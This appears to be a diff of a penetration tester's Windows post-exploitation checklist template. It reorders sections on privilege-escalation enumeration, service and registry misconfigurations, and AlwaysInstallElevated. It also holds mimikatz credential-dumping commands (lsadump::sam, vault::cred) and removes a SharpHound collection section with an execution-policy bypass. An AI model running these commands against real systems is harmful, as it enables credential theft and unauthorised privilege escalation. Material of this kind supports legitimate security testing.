@@ -1,11 +1,7 @@
-<% tp.file.rename("2_loot_Windows")%>
 Hostname `hostname`
 	
 
 ## PrivEsc Relevant
-
-#### winPEAS Script
-	
 
 ##### Users
 ```powershell
@@ -53,23 +49,6 @@ Example for administrative, non-vulnerable account:
 ##### Working Dir for attack
 ```powershell
 Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
-```
-	
-##### Passwords (mimikatz)
-```powershell
-privilege::debug
-```
-
-```powershell
-token::elevate
-```
-
-```powershell
-lsadump::sam
-```
-(lsadump::lsa /patch ??)
-```powershell
-vault::cred /patch
 ```
 	
 ##### SysInfo
@@ -151,30 +130,63 @@ icacls $file
 Also check if any of the pathnames are unquoted but contain spaces. e.g. with: `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`
 ##### Scheduled tasks
 ```powershell
-schtasks /query /fo LIST /v
-```
-Alternative: `Get-ScheduledTask`
-```powershell
-schtasks /query /fo CSV /v | ConvertFrom-Csv | where { $_.Status -ne "Disabled" } | where { $_.Author -notlike "*Microsoft*" } | where { $_.Author -notlike "*N/A*" } | where { $_.Author -ne "Author" }
-```
-
-```powershell
 schtasks /query /fo CSV /v | ConvertFrom-Csv | where { $_.Status -ne "Disabled" } | where { $_."Run As User" -like "SYSTEM" }
 ```
-	
+Alternative: `Get-ScheduledTask`
+Missing binaries?
+```powershell
+autorunsc64.exe -a t | more
+```
+(Part of SysInternals - Look for "File Not Found". Also try with `-a s`)
 ##### Systemwide patches
 ```powershell
 wmic qfe get Caption"," Description"," HotFixID"," InstalledOn
 ```
-	
 ##### History
 ```powershell
-Get-History
+Get-History; (Get-PSReadlineOption).HistorySavePath | cat -
+```
+##### Modifiable Services
+```powershell
+accesschk.exe -accepteula -wuvc "Everyone" *
+```
+(Sysinternals. Also try with  `"Users"`)
+##### LOLBAS
+https://lolbas-project.github.io/#
+
+##### PowerUp.ps1
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
+	include the file `. .\PowerUp.ps1`  and then e.g. `Get-ModifiableServiceFile`
+
+##### Registry misconfigurations
+Can .msi's run privileged without UAC?
+```powershell
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+```
+(-> `msiexec /quiet /qn /i c:\path\to\file.msi`)
+
+Always install elevated
+```powershell
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+##### Passwords (mimikatz)
+```powershell
+privilege::debug
 ```
 
 ```powershell
-(Get-PSReadlineOption).HistorySavePath | cat -
+token::elevate
 ```
+
+```powershell
+lsadump::sam
+```
+(lsadump::lsa /patch ??)
+```powershell
+vault::cred /patch
+```
+	
 
 
 ## Loot for later
@@ -238,7 +250,7 @@ cat %WINDIR%\Panther\Unattend\Unattended.xml
 ```powershell
 cat %WINDIR%\Panther\Unattended.xml
 ```
-	
+
 Shadow Copy?
 ```powershell
 vssadmin list shadows
@@ -247,34 +259,6 @@ vssadmin list shadows
 ```powershell
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-	
-
-
-# Bloodhound
-Kali:
-```bash
-sudo apt-get install neo4j bloodhound && sudo neo4j console && bloodhound
-```
-
-```bash
-scp SharpHound.exe $user@$hip:"C:\\Users\\$user\\Downloads"
-```
-
-Victim:
-```powershell
-powershell -ep bypass
-```
-
-```powershell
-cd Downloads
-```
-
-```powershell
-.\SharpHound.exe --CollectionMethods All --zipfilename data.zip -d $dnsserver
-```
-
-
-
 
 
 # Findings
